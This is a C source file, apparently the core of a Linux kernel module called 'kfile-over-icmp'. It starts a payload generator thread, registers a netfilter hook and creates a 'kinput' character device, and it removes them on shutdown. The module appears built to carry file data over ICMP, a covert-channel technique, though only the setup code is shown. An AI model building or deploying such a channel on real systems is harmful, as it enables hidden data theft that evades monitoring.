#include "core.h"
#include "net/netfilter.h"
#include "chrdev/chrdev.h"
#include "fs/payload_generator.h"

static const char* input_chrdev_name = "kinput";
static int input_chrdev_major_num;

int core_start(void)
{
    if (start_payload_generator_thread()) {
        printk(KERN_ERR "kfile-over-icmp: failed to start payload generator thread\n");
        return -EINVAL;
    }

    // register netfilter hook.
    // note that it must be AFTER initializing the payload generator thread, otherwise the hook
    // can try to reach the global payload generator function before it is initialized.
    register_nf_hook();
    printk(KERN_DEBUG "kfile-over-icmp: registered netfilter hook\n");

    // create a character device to receive user input
    input_chrdev_major_num = register_input_chrdev(input_chrdev_name);
    if (0 > input_chrdev_major_num) {
        printk(KERN_ERR "kfile-over-icmp: failed to register character device (%d)\n", input_chrdev_major_num);
        return -EINVAL;
    }

    printk(KERN_DEBUG "kfile-over-icmp: successfully registered character device. major: %d\n", input_chrdev_major_num);

    return 0;
}

void core_stop(void)
{
    // remove our character device
    unregister_input_chrdev(input_chrdev_major_num, input_chrdev_name);
    printk(KERN_DEBUG "kfile-over-icmp: sucessfully unregistered character device\n");

    stop_payload_generator_thread();
    printk(KERN_DEBUG "kfile-over-icmp: stopped payload generator thread\n");

    // remove netfilter hook
    unregister_nf_hook();
    printk(KERN_DEBUG "kfile-over-icmp: netfilter hook removed\n");
}